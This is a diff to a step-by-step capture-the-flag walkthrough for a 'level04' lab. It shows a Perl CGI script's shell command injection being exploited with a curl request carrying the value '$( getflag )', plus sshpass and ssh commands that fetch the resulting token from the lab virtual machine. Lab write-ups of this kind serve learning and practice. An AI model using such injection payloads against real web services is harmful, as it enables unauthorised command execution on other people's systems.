@@ -10,7 +10,7 @@
 2. __Observation__ (Guest): the previous command reveals 1 file possibly of interest,
 	named `level04.pl`
 	```
-	.bash_logout  .bashrc  level04.pl  .profile
+	.bash_logout  .bashrc  .profile  level04.pl
 	```
 
 3. __Action__ (Guest): check the file access control list of the `level04.pl` file
@@ -56,19 +56,12 @@
 	x(param("x"));
 	```
 
-7. __Action__ (Guest): send a request to the server with a malicious `x` parameter value
-	to exploit the shell command injection described above, invoking the `getflag` command
+7. __Action__ (Host): send a request to the server with a malicious `x` parameter value
+	to exploit the shell command injection described above, invoking the `getflag` command,
+	and save the token to the `flag` file
 	```sh
-	curl http://localhost:4747 -d 'x=$( getflag )' | egrep -o '[^ ]+$' >/tmp/token
-	```
-
-8. __Action__ (Host): copy the token from the virtual machine
-	```sh
-	sshpass -f level03/flag \
-		scp -P 4242 level04@192.168.122.214:/tmp/token level04/flag
-	```
-
-9. __Action__ (Guest): remove the `token` file
-	```sh
-	rm /tmp/token
+	sshpass -f level03/flag 2>/dev/null \
+		ssh -p 4242 level04@192.168.122.214 \
+			"curl http://localhost:4747 -d 'x=\$( getflag )'" \
+	| egrep -o '[^ ]+$' >level04/flag
 	```
